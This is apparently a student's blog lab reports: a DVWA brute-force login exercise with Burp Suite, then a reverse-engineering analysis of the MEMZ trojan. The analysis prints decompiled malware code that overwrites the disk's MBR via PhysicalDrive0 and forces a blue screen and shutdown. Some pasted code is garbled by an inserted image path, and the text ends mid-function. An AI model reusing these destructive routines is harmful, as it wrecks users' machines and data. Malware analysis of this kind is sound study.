<h2 id="部署-DVWA"><a href="#部署-DVWA" class="headerlink" title="部署 DVWA"></a>部署 DVWA</h2><ol>
<li><p>打开 Kali Linux，在终端输入以下命令部署 DVWA：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name w1ndys_dvwa -p 8081:80 vulnerables/web-dvwa</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>打开浏览器，输入<code>http://127.0.0.1:8081</code>访问 DVWA。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-1.png"
                      alt="启动DVWA成功"
                ></p>
</li>
</ol>
<h2 id="登录-DVWA"><a href="#登录-DVWA" class="headerlink" title="登录 DVWA"></a>登录 DVWA</h2><ol>
<li><p>输入用户名<code>admin</code>和密码<code>password</code>登录 DVWA。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-2.png"
                      alt="登录DVWA成功"
                ></p>
</li>
<li><p>设置<code>DVWA Security</code>为<code>Low</code>，并点击<code>Start</code>启动 DVWA。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-3.png"
                      alt="设置DVWA Security为Low"
                ></p>
</li>
</ol>
<h2 id="FoxyProxy"><a href="#FoxyProxy" class="headerlink" title="FoxyProxy"></a>FoxyProxy</h2><ol>
<li><p>安装 FoxyProxy。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-4.png"
                      alt="安装FoxyProxy成功"
                ></p>
</li>
<li><p>配置代理</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-5.png"
                      alt="配置成功"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-6.png"
                      alt="选择代理"
                ></p>
</li>
</ol>
<h2 id="BurpSuit"><a href="#BurpSuit" class="headerlink" title="BurpSuit"></a>BurpSuit</h2><ol>
<li><p>设置代理</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-7.png"
                      alt="设置代理"
                ></p>
</li>
<li><p>开启拦截</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-8.png"
                      alt="开启拦截"
                ></p>
</li>
<li><p>回到 DVWA，点击<code>Login</code>按钮，查看请求。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-9.png"
                      alt="查看请求"
                ></p>
</li>
<li><p>抓到包信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-10.png"
                      alt="包信息"
                ></p>
</li>
<li><p>添加单点爆破</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-11.png"
                      alt="添加单点爆破"
                ></p>
</li>
<li><p>添加字典</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-12.png"
                      alt="添加字典"
                ></p>
</li>
<li><p>开始爆破</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-13.png"
                      alt="开始爆破"
                ></p>
<p>观察到 password 的 length 与其他不同，疑似正确密码。</p>
</li>
<li><p>尝试登录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image-14.png"
                      alt="尝试登录"
                ></p>
</li>
</ol>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>通过 FoxyProxy 和 BurpSuit 的组合，成功爆破 SSH 密码。</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>网络安全原理实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验报告5——彩虹猫病毒逆向</title>
    <url>/posts/a1a5dde8.html</url>
    <content><![CDATA[<h2 id="实验工具"><a href="#实验工具" class="headerlink" title="实验工具"></a>实验工具</h2><p>实验平台：Hello-CTF-OS</p>
<p>实验工具：IDA Pro</p>
<p>病毒样本名称：geometry dash auto speedhack.exe</p>
<p>MD5：19dbec50735b5f2a72d4199c4e184960</p>
<p>SHA1：6fed7732f7cb6f59743795b2ab154a3676f4c822</p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="运行病毒样本"><a href="#运行病毒样本" class="headerlink" title="运行病毒样本"></a>运行病毒样本</h3><ol>
<li>打开任务管理器，观察进程情况。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-070de21e15f36fab6472ab224bac1f37.png?source=d16d100b"
                      alt="img"
                ></p>
<ol start="2">
<li>运行病毒样本，观察进程情况。</li>
</ol>
<p>略</p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><h4 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h4><ol>
<li>查一下文件信息</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-618531a8b718a7d8e0cbfb8d534f57b8.png?source=d16d100b"
                      alt="img"
                ></p>
<ol start="2">
<li><p>打开 IDA Pro，导入病毒样本。</p>
</li>
<li><p>定位到 start 函数，查看伪代码。</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-b00bb81f8e8ab65414f8a5aa0b568be7.png?source=d16d100b"
                      alt="img"
                ></p>
<h4 id="start-函数分析"><a href="#start-函数分析" class="headerlink" title="start 函数分析"></a>start 函数分析</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">dword_405184 = GetSystemMetrics(<span class="number">0</span>); <span class="comment">// 获取屏幕宽度</span></span><br><span class="line">dword_405188 = GetSystemMetrics(<span class="number">1</span>); <span class="comment">// 获取屏幕高度</span></span><br><span class="line">CommandLineW = GetCommandLineW(); <span class="comment">// 获取命令行内容</span></span><br><span class="line">v1 = CommandLineToArgvW(CommandLineW, &amp;pNumArgs);<span class="comment">// 把 CommandLineW 转化成一个参数数组，包括命令行所有参数</span></span><br><span class="line"><span class="keyword">if</span> ( pNumArgs &gt; <span class="number">1</span> ) <span class="comment">// v1 指向该函数，用于访问命令行参数</span></span><br><span class="line"><span class="comment">//...其他代码...</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>变量说明：<br>v1 参数数组，可以访问命令行所有参数<br>pNumArgs 参数个数</p>
</blockquote>
<p>根据 pNumArgs 和 v1 的内容可以把 start 函数分为三个部分：</p>
<ol>
<li><p>watchdog 部分</p>
</li>
<li><p>main 部分</p>
</li>
<li><p>无参数部分</p>
</li>
</ol>
<p>双击运行病毒样本，首先运行的是无参数部分</p>
<h4 id="无参数部分分析"><a href="#无参数部分分析" class="headerlink" title="无参数部分分析"></a>无参数部分分析</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 前面的代码</span></span><br><span class="line"><span class="keyword">if</span> (MessageBoxA(</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;The software you just executed is considered malware.\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;This malware will harm your computer and makes it unusable.\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;If you know what this malware does and are using a safe environment to test, press Yes to start it.\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?&quot;</span>,</span><br><span class="line">        <span class="string">&quot;MEMZ&quot;</span>,</span><br><span class="line">        <span class="number">0x34u</span>) == <span class="number">6</span> &amp;&amp;</span><br><span class="line">    MessageBoxA(</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;THIS IS THE LAST WARNING!\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;STILL EXECUTE IT?&quot;</span>,</span><br><span class="line">        <span class="string">&quot;MEMZ&quot;</span>,</span><br><span class="line">        <span class="number">0x34u</span>) == <span class="number">6</span>)</span><br><span class="line"><span class="comment">// 后面的代码</span></span><br></pre></td></tr></table></figure></div>

<p>很明显这是两次弹窗的内容</p>
<p>Message BoxA 是 Windows API 中的一个函数，用来弹出一个对话框。如果用户点击“是”，返回值 6</p>
<p>代码继续执行的内容如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    v10 = (WCHAR *)LocalAlloc(<span class="number">0x40u</span>, <span class="number">0x4000u</span>);</span><br><span class="line">    GetModuleFileNameW(<span class="number">0</span>, v10, <span class="number">0x2000u</span>);</span><br><span class="line">    v11 = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ShellExecuteW(<span class="number">0</span>, <span class="number">0</span>, v10, <span class="string">L&quot;/watchdog&quot;</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">      --v11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 );</span><br><span class="line">    pExecInfo.cbSize = <span class="number">60</span>;</span><br><span class="line">    pExecInfo.lpFile = v10;</span><br><span class="line">    pExecInfo.lpParameters = <span class="string">L&quot;/main&quot;</span>;</span><br><span class="line">    pExecInfo.fMask = <span class="number">64</span>;</span><br><span class="line">    pExecInfo.hwnd = <span class="number">0</span>;</span><br><span class="line">    pExecInfo.lpVerb = <span class="number">0</span>;</span><br><span class="line">    pExecInfo.lpDirectory = <span class="number">0</span>;</span><br><span class="line">    pExecInfo.hInstApp = <span class="number">0</span>;</span><br><span class="line">    pExecInfo.nShow = <span class="number">10</span>;</span><br><span class="line">    ShellExecuteExW(&amp;pExecInfo);</span><br><span class="line">    SetPriorityClass(pExecInfo.hProcess, <span class="number">0x80u</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>创建了 5 个命令行参数为 <code>/watchdog</code> 的进程，和 1 个命令行参数为 <code>/main</code> 的进程。在病毒文件执行的时候可以看到这 6 个进程。</p>
<p>到此无参数部分分析完毕。</p>
<h4 id="watchdog-部分分析"><a href="#watchdog-部分分析" class="headerlink" title="watchdog 部分分析"></a>watchdog 部分分析</h4><p>函数名是看门狗？</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !lstrcmpW(v1[<span class="number">1</span>], <span class="string">L&quot;/watchdog&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_40114A, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      pExecInfo.lpVerb = (LPCWSTR)<span class="number">48</span>;</span><br><span class="line">      pExecInfo.lpParameters = (LPCWSTR)sub_401000;</span><br><span class="line">      pExecInfo.hIcon = (HANDLE)<span class="string">&quot;hax&quot;</span>;</span><br><span class="line">      pExecInfo.lpFile = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(&amp;pExecInfo.lpDirectory, <span class="number">0</span>, <span class="number">28</span>);</span><br><span class="line">      pExecInfo.hProcess = <span class="number">0</span>;</span><br><span class="line">      RegisterClassExA((<span class="type">const</span> WNDCLASSEXA *)&amp;pExecInfo.lpVerb);</span><br><span class="line">      CreateWindowExA(<span class="number">0</span>, <span class="string">&quot;hax&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> ( GetMessageW(&amp;Msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        TranslateMessage(&amp;Msg);</span><br><span class="line">        DispatchMessageW(&amp;Msg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>创建了一个线程，并在线程中调用了 <code>sub_40114A</code> 函数。还出现了<code>sub_401000</code> 函数</p>
<h5 id="sub-40114A-函数分析"><a href="#sub-40114A-函数分析" class="headerlink" title="sub_40114A 函数分析"></a>sub_40114A 函数分析</h5><p>跟进函数看看里面发生了什么</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __stdcall __noreturn <span class="title function_">sub_40114A</span><span class="params">(LPVOID lpThreadParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE CurrentProcess;     <span class="comment">// eax</span></span><br><span class="line">    HANDLE Toolhelp32Snapshot; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">const</span> CHAR *v3;            <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">int</span> v4;                    <span class="comment">// esi</span></span><br><span class="line">    PROCESSENTRY32W pe;        <span class="comment">// [esp+Ch] [ebp-23Ch] BYREF</span></span><br><span class="line">    LPCSTR lpString1;          <span class="comment">// [esp+238h] [ebp-10h]</span></span><br><span class="line">    <span class="type">int</span> v7;                    <span class="comment">// [esp+23Ch] [ebp-Ch]</span></span><br><span class="line">    LPCSTR lpString2;          <span class="comment">// [esp+240h] [ebp-8h]</span></span><br><span class="line">    HANDLE hObject;            <span class="comment">// [esp+244h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    lpString1 = (LPCSTR)LocalAlloc(<span class="number">0x40u</span>, <span class="number">0x200u</span>);</span><br><span class="line">    CurrentProcess = GetCurrentProcess();</span><br><span class="line">    GetProcess../images/CyberSecurity/<span class="number">5</span>-cat/imageFileNameA(CurrentProcess, lpString1, <span class="number">512</span>);</span><br><span class="line">    Sleep(<span class="number">0x3E8u</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) <span class="comment">// 死循环</span></span><br><span class="line">    &#123;</span><br><span class="line">        Toolhelp32Snapshot = CreateToolhelp32Snapshot(<span class="number">2u</span>, <span class="number">0</span>); <span class="comment">// 获取进程快照</span></span><br><span class="line">        pe.dwSize = <span class="number">556</span>;</span><br><span class="line">        Process32FirstW(Toolhelp32Snapshot, &amp;pe);</span><br><span class="line">        v3 = lpString1;</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> <span class="comment">// 遍历进程列表</span></span><br><span class="line">        &#123;</span><br><span class="line">            hObject = OpenProcess(<span class="number">0x400u</span>, <span class="number">0</span>, pe.th32ProcessID);</span><br><span class="line">            lpString2 = (LPCSTR)LocalAlloc(<span class="number">0x40u</span>, <span class="number">0x200u</span>);</span><br><span class="line">            GetProcess../images/CyberSecurity/<span class="number">5</span>-cat/imageFileNameA(hObject, lpString2, <span class="number">512</span>);</span><br><span class="line">            <span class="keyword">if</span> (!lstrcmpA(v3, lpString2)) <span class="comment">// 如果进程名相同,v4+1</span></span><br><span class="line">                ++v4;</span><br><span class="line">            CloseHandle(hObject);</span><br><span class="line">            LocalFree((HLOCAL)lpString2);</span><br><span class="line">        &#125; <span class="keyword">while</span> (Process32NextW(Toolhelp32Snapshot, &amp;pe));</span><br><span class="line">        CloseHandle(Toolhelp32Snapshot);</span><br><span class="line">        <span class="keyword">if</span> (v4 &lt; v7) <span class="comment">// 如果进程数v4&lt;v7,执行`sub_401021`函数</span></span><br><span class="line">            sub_401021();</span><br><span class="line">        v7 = v4;</span><br><span class="line">        Sleep(<span class="number">0xAu</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先是一个 while(1)死循环，首先获取系统快照，然后遍历快照每一个进程，比较进程名字是否相同，如果相同，v4+1。如果 v4&lt;v7，则调用<code>sub_401021</code>函数。</p>
<blockquote>
<p>总的来说，这个函数是用来监控系统进程的变化，可以检测无参数部分开启的进程是否被关闭。如果检测到少于 6 个进程，则调用<code>sub_401021</code>函数。</p>
</blockquote>
<h5 id="sub-401021-函数分析"><a href="#sub-401021-函数分析" class="headerlink" title="sub_401021 函数分析"></a>sub_401021 函数分析</h5><p>继续看看<code>sub_401021</code>函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BOOL __usercall sub_401021 @&lt;eax&gt;(<span class="type">int</span> a1 @&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v1;                                                             <span class="comment">// esi</span></span><br><span class="line">    <span class="type">int</span> v2;                                                             <span class="comment">// esi</span></span><br><span class="line">    HMODULE LibraryA;                                                   <span class="comment">// edi</span></span><br><span class="line">    FARPROC RtlAdjustPrivilege;                                         <span class="comment">// ebx</span></span><br><span class="line">    FARPROC NtRaiseHardError;                                           <span class="comment">// eax</span></span><br><span class="line">    <span class="type">void</span>(__cdecl * v6)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); <span class="comment">// esi</span></span><br><span class="line">    HANDLE CurrentProcess;                                              <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v9;                                                             <span class="comment">// [esp-20h] [ebp-28h]</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">TOKEN_PRIVILEGES</span> <span class="title">v10</span>;</span>                                       <span class="comment">// [esp-18h] [ebp-20h] BYREF</span></span><br><span class="line">    <span class="type">int</span> v11;                                                            <span class="comment">// [esp-8h] [ebp-10h] BYREF</span></span><br><span class="line">    HANDLE v12;                                                         <span class="comment">// [esp-4h] [ebp-Ch] BYREF</span></span><br><span class="line">    <span class="type">int</span> v13;                                                            <span class="comment">// [esp+0h] [ebp-8h] BYREF</span></span><br><span class="line">    <span class="type">int</span> v14;                                                            <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    v1 = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">do</span> <span class="comment">// 循环创建20个进程，随机出现在屏幕任意位置</span></span><br><span class="line">    &#123;</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0x1000u</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        Sleep(<span class="number">0x64u</span>);</span><br><span class="line">        --v1;</span><br><span class="line">    &#125; <span class="keyword">while</span> (v1);</span><br><span class="line">    v2 = v14;</span><br><span class="line">    v14 = a1;</span><br><span class="line">    v9 = v2;</span><br><span class="line">    LibraryA = LoadLibraryA(<span class="string">&quot;ntdll&quot;</span>);</span><br><span class="line">    RtlAdjustPrivilege = GetProcAddress(LibraryA, <span class="string">&quot;RtlAdjustPrivilege&quot;</span>);</span><br><span class="line">    NtRaiseHardError = GetProcAddress(LibraryA, <span class="string">&quot;NtRaiseHardError&quot;</span>);</span><br><span class="line">    v6 = (<span class="type">void</span>(__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))NtRaiseHardError;</span><br><span class="line">    <span class="keyword">if</span> (RtlAdjustPrivilege &amp;&amp; NtRaiseHardError)                               <span class="comment">//触发蓝屏</span></span><br><span class="line">    &#123;</span><br><span class="line">        ((<span class="type">void</span>(__cdecl *)(<span class="type">int</span>, <span class="type">int</span>, _DWORD, <span class="type">char</span> *, <span class="type">int</span>, <span class="type">int</span>))RtlAdjustPrivilege)(<span class="number">19</span>, <span class="number">1</span>, <span class="number">0</span>, (<span class="type">char</span> *)&amp;v13 + <span class="number">3</span>, v13, v9);</span><br><span class="line">        v6(<span class="number">-1073741790</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, &amp;v11);</span><br><span class="line">    &#125;</span><br><span class="line">    CurrentProcess = GetCurrentProcess();</span><br><span class="line">    OpenProcessToken(CurrentProcess, <span class="number">0x28u</span>, &amp;v12);</span><br><span class="line">    LookupPrivilegeValueW(<span class="number">0</span>, <span class="string">L&quot;SeShutdownPrivilege&quot;</span>, &amp;v10.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">    v10.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    v10.Privileges[<span class="number">0</span>].Attributes = <span class="number">2</span>;</span><br><span class="line">    AdjustTokenPrivileges(v12, <span class="number">0</span>, &amp;v10, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ExitWindowsEx(<span class="number">6u</span>, <span class="number">0x10007u</span>);                                 <span class="comment">// 关闭系统，退出Windows，关机/重启</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>创建 20 个进程，随机出现在屏幕任意位置</p>
</li>
<li><p>使用<code>RtlAdjustPrivilege</code>函数提升权限，调用<code>NtRaiseHardError</code>函数触发蓝屏</p>
</li>
<li><p>使用<code>SeShutdownPrivilege</code>权限关闭系统，退出 Windows，关机&#x2F;重启，所以在此处调用<code>sub_401021</code>函数，监控系统中 6 个进程是否被关闭，如果被关闭，则关闭系统，退出 Windows，关机&#x2F;重启。</p>
</li>
</ol>
<h5 id="sub-401000-函数分析"><a href="#sub-401000-函数分析" class="headerlink" title="sub_401000 函数分析"></a>sub_401000 函数分析</h5><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">LRESULT __stdcall <span class="title function_">sub_401000</span><span class="params">(HWND a1, UINT a2, WPARAM a3, LPARAM a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+0h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">16</span> &amp;&amp; a2 != <span class="number">22</span> )    <span class="comment">//只处理16或22的消息</span></span><br><span class="line">    <span class="keyword">return</span> DefWindowProcW(a1, a2, a3, a4);</span><br><span class="line">  sub_401021((<span class="type">int</span>)&amp;savedregs);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>函数只处理了 16 和 22 的消息，其他消息返回 0，并调用<code>sub_401021</code>函数。</p>
<p>在此处调用<code>sub_401021</code>函数，可以检测到用户是否主动关机&#x2F;重启，如果用户主动关机也会执行该函数</p>
<p>所以，watchdog 部分的功能是监控进程状态和用户是否主动关机，如有发现，立即进入<code>sub_401021</code>函数，执行最后操作</p>
<h4 id="main-部分分析"><a href="#main-部分分析" class="headerlink" title="main 部分分析"></a>main 部分分析</h4><p>main 函数是核心部分，首先打开物理磁盘覆盖 MBR，达到开机执行彩虹猫的效果，另一块是运行病毒出现的各种现象</p>
<h5 id="物理磁盘覆盖-MBR"><a href="#物理磁盘覆盖-MBR" class="headerlink" title="物理磁盘覆盖 MBR"></a>物理磁盘覆盖 MBR</h5><p>MBR 是一个引导程序，引导加载操作系统，所以需要覆盖掉 MBR，达到开机执行彩虹猫的效果。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">FileA = CreateFileA(<span class="string">&quot;\\\\.\\PhysicalDrive0&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hObject = FileA;</span><br><span class="line">    <span class="keyword">if</span> ( FileA == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">      ExitProcess(<span class="number">2u</span>);</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = LocalAlloc(<span class="number">0x40u</span>, <span class="number">0x10000u</span>);</span><br><span class="line">    v5 = v4;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">      *v5 = v5[byte_402118 - v4];</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; <span class="number">0x12F</span> );</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x7A0</span>; ++i )</span><br><span class="line">      v4[i + <span class="number">510</span>] = byte_402248[i];</span><br><span class="line">    <span class="keyword">if</span> ( !WriteFile(FileA, v4, <span class="number">0x10000u</span>, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">      ExitProcess(<span class="number">3u</span>);</span><br><span class="line">    CloseHandle(hObject);</span><br></pre></td></tr></table></figure></div>

<p>使用 CreateFileA 函数打开主磁盘 PhysicalDrive0，并使用 WriteFile 函数覆盖掉 MBR。</p>
<h5 id="运行病毒出现的各种现象"><a href="#运行病毒出现的各种现象" class="headerlink" title="运行病毒出现的各种现象"></a>运行病毒出现的各种现象</h5><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v7 = CreateFileA(<span class="string">&quot;\\note.txt&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80u</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">    ExitProcess(<span class="number">4u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !WriteFile(</span><br><span class="line">          v7,</span><br><span class="line">          <span class="string">&quot;YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;Your computer won&#x27;t boot up again,\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;so use it as long as you can!\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;:D\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;Trying to kill MEMZ will cause your system to be\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;destroyed instantly, so don&#x27;t try it :D&quot;</span>,</span><br><span class="line">          <span class="number">0xDAu</span>,</span><br><span class="line">          &amp;NumberOfBytesWritten,</span><br><span class="line">          <span class="number">0</span>) )</span><br><span class="line">    ExitProcess(<span class="number">5u</span>);</span><br><span class="line">  CloseHandle(v7);</span><br><span class="line">  ShellExecuteA(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;notepad&quot;</span>, <span class="string">&quot;\\note.txt&quot;</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = (DWORD *)&amp;off_405130;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    Sleep(v9[<span class="number">1</span>]);</span><br><span class="line">    CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_401A2B, v9, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    ++v8;</span><br><span class="line">    v9 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v8 &lt; <span class="number">0xA</span> );</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    Sleep(<span class="number">0x2710u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>创建一个<code>note.txt</code>文件，并写入内容，然后打开<code>note.txt</code>文件</p>
<p>接下来，创建 10 个线程，每个线程执行<code>sub_401A2B</code>函数，该函数会在屏幕上随机出现一些图标，并在图标上显示一些文字。</p>
<p>创建完之后，进入死循环，每 10 秒暂停一次</p>
<h6 id="进入-sub-401A2B-函数"><a href="#进入-sub-401A2B-函数" class="headerlink" title="进入 sub_401A2B 函数"></a>进入 sub_401A2B 函数</h6><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __stdcall __noreturn <span class="title function_">sub_401A2B</span><span class="params">(<span class="type">int</span> (__cdecl **lpThreadParameter)(<span class="type">int</span>, <span class="type">int</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v1-- )</span><br><span class="line">      v1 = (*lpThreadParameter)(v2++, i);</span><br><span class="line">    Sleep(<span class="number">0xAu</span>);</span><br><span class="line">  &#125;</span><br><span 